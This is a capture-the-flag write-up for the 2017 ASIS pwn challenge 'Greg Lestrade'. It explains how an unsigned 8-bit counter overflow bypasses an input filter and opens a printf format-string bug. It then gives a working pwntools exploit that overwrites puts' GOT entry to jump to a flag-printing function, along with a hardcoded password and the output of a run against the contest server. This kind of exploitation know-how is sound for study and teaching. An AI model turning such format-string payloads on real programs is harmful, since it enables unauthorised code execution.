# 2017 Asis - [PWN] Greg Lestrade

## Key words

- 64bit ELF
- integer overflow
- format string

## Solution

문제의 main 부분은 크게 상관이 없고 내부 함수에 핵심 내용이 들어 있습니다.

```c
__int64 sub_40091F()
{
  __int64 result; // rax@4
  __int64 v1; // rsi@8
  unsigned __int8 i; // [sp+Eh] [bp-412h]@1
  unsigned __int8 v3; // [sp+Fh] [bp-411h]@1
  char buf[1032]; // [sp+10h] [bp-410h]@1
  __int64 v5; // [sp+418h] [bp-8h]@1

  v5 = *MK_FP(__FS__, 40LL);
  memset(buf, 0, 0x400uLL);
  puts("[*] Hello, admin ");
  printf("Give me your command : ");
  read(0, buf, 0x3FFuLL);
  v3 = strlen(buf) + 1;
  for ( i = 0; i < v3; ++i )
  {
    if ( buf[i] <= 96 || buf[i] > 122 )
    {
      puts("[*] for secure commands, only lower cases are expected. Sorry admin");
      result = 0LL;
      goto LABEL_8;
    }
  }
  printf(buf, buf);
  result = 0LL;
LABEL_8:
  v1 = *MK_FP(__FS__, 40LL) ^ v5;
  return result;
}
```

입력을 받고 입력을 검사한 뒤에 printf 에서 포멧 스트링이 발생합니다.

문제는 입력을 검사 하는 필터링 부분인데 자세히 보면 검사 하는 for 문의 형태가 unsigned int8로 되어 있습니다.

따라서 255개의 문자열을 만들면 v3가 0이 되어 필터링을 우회 할수가 있습니다. 그 이후로는 0x400876에 system("/bin/cat flag")를 해주는 매직 함수가 존재 하기 때문에 리턴 주소를 이쪽으로 변경해주면 됩니다.

## Solution Code

```python
#-*- coding:utf-8 -*-
from pwn import *

server = "146.185.132.36"
port   = 12431

secret_action = 0x400a2c
secret_action = 0x400876
r = remote(server, port)
print r.recv()

passwd = "7h15_15_v3ry_53cr37_1_7h1nk"
r.send(passwd)
print r.recvuntil("action\n")

puts_got = 0x602020

r.sendline("1")
print r.recv()

payload = "%40$n"
payload += "Z" * 0x8 # 08
payload += "%41$hhn"
payload += "Z" * (0x40 - 0x8) # 0x40
payload += "%42$hhn"
payload += "Z" * (0x76 - 0x40) # 0x76
payload += "%43$hhn"
payload += "Z" * (255 - len(payload)) + "\x00"
payload += p64(puts_got+3)
payload += p64(puts_got+1)
payload += p64(puts_got+2)
payload += p64(puts_got)

r.send(payload)
print r.recv()
print r.recv()
```

## Result

```
tbkim@ubuntu:~/working/jal2013/medium$ python sol_goblin.py
[+] Opening connection to 146.185.132.36 on port 12431: Done
[*] Welcome admin login system!


Login with your credential...
Credential :
[*] password : 7h15_15_v3ry_53cr37_1_7h1nk
[*] Closed connection to 146.185.132.36 port 12431
[+] Opening connection to 146.185.132.36 on port 12431: Done
[*] Welcome admin login system!


Login with your credential...
Credential : 0) exit
1) admin action

[*] Hello, admin

Give me your command :
ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZASIS{_ASIS_N3W_pwn_1S_goblin_pwn4b13!}
ASIS{_ASIS_N3W_pwn_1S_goblin_pwn4b13!}
```